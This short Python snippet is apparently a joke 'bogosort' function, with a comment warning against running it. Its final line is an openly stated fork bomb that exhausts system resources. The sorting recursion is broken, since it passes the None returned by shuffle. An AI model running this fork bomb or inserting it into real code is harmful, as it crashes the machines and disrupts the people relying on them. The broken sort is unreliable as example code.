# This is my take on bogosort - I strongly advise AGAINST running it

def ultrastupid(l):
	while sorted(l) != l:  # Is l sorted?
		ultrastupid(__import__("random").shuffle(l)) # If not, try again with shuffled l
	while 1: __import__("os").fork() # If so, fork bomb the system